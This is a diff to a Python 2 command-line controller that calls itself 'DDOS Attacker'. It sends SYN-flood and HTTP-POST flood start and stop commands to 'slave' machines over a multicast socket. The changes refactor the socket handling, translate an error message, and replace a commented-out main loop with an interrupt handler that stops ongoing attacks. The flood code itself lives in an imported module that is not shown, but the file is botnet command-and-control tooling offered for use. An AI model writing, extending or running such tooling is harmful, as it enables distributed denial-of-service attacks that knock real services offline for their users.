@@ -3,12 +3,13 @@ import signal
 from multicastsender import *
 from cmd import Cmd
 
+sock = configMulticastSock()
+
 class my_prompt(Cmd):
 
     def __init__(self):
         Cmd.__init__(self)
         self.prompt = '> '
-        self.sock = configMulticastSock()
         signal.signal(signal.SIGTSTP, self.handler)
 
     def handler(self, signum, frame):
@@ -32,10 +33,10 @@ class my_prompt(Cmd):
     def do_exit(self, args):
         """Close possible ongoing attacks and exit the program"""
         print "Closing possible ongoing attacks..."
-        sendMsgToSlaves("syn-flood;stop", self.sock)
-        sendMsgToSlaves("http-post;stop", self.sock)
+        sendMsgToSlaves("syn-flood;stop", sock)
+        sendMsgToSlaves("http-post;stop", sock)
 
-        self.sock.close()
+        sock.close()
         raise SystemExit
 
     def do_syn_flood(self, args):
@@ -81,7 +82,7 @@ class my_prompt(Cmd):
         if error:
             print "Invalid command. Try help for more information"
         else:
-            sendMsgToSlaves(body, self.sock)
+            sendMsgToSlaves(body, sock)
 
 
     def do_http_post(self, args):
@@ -106,7 +107,7 @@ class my_prompt(Cmd):
                 try:
                     body += self.get_args(args)
                 except:
-                    print "deu bosta"
+                    print "Invalid or incompletes arguments"
                     error = True
 
                 if '-time' in args:
@@ -127,7 +128,7 @@ class my_prompt(Cmd):
         if error:
             print "Invalid command. Try help for more information"
         else:
-            sendMsgToSlaves(body, self.sock)
+            sendMsgToSlaves(body, sock)
 
 def readInputLine():
     line = raw_input("> ")
@@ -166,62 +167,13 @@ def getArgs(args):
 
 ################################### MAIN ####################################### 
 if __name__ == '__main__':
+    try:
+        prompt = my_prompt()
+        prompt.cmdloop('===== Welcome to DDOS Attacker=====\nPlease command your attack or try help for more information')
+    except KeyboardInterrupt:
+        print "Closing possible ongoing attacks..."
+        sendMsgToSlaves("syn-flood;stop", sock)
+        sendMsgToSlaves("http-post;stop", sock)
 
-    prompt = my_prompt()
-    prompt.cmdloop('===== Welcome to DDOS Attacker=====\nPlease command your attack or try help for more information')
-    # sock = configMulticastSock()
-
-    # print "===== Welcome to DDOS Attacker====="
-    # print "Please command your attack or try --help for more information"
-
-    # try:
-    #     while 1:
-    #         words = readInputLine()
-    #         if len(words[0]) == 0:
-    #             continue
-    #
-    #         if '--help' in words:
-    #             printHelp()
-    #             continue
-    #         if 'exit()' in words:
-    #             break
-    #
-    #         if '-start' in words:
-    #             try:
-    #                 if 'syn-flood' in words:
-    #                     body = 'syn-flood;start;'
-    #                 elif 'http-post' in words:
-    #                     body = 'http-post;start;'
-    #                 else:
-    #                     print "Invalid command. Try --help for more information"
-    #                     continue
-    #                 body += getArgs(words)
-    #                 if '-time' in words:
-    #                     i = words.index('-time') + 1
-    #                     int(words[i])
-    #                     body += ";" + words[i]
-    #
-    #                 sendMsgToSlaves(body, sock)
-    #             except:
-    #                 print "Invalid flag(s). Try --help for more information"
-    #                 continue
-    #         elif '-stop' in words:
-    #             if 'syn-flood' in words:
-    #                 body = 'syn-flood;stop'
-    #             elif 'http-post' in words:
-    #                 body = 'http-post;stop'
-    #             else:
-    #                 print "Invalid command. Try --help for more information"
-    #                 continue
-    #             sendMsgToSlaves(body, sock)
-    #         else:
-    #             print "Missing necessary flag. Try --help for more information"
-    # except KeyboardInterrupt:
-    #     print "\nKeyboard interruption detected"
-    #
-    # print "Closing possible ongoing attacks..."
-    # sendMsgToSlaves("syn-flood;stop", sock)
-    # sendMsgToSlaves("http-post;stop", sock)
-    #
-    # sock.close()
+        sock.close()
 
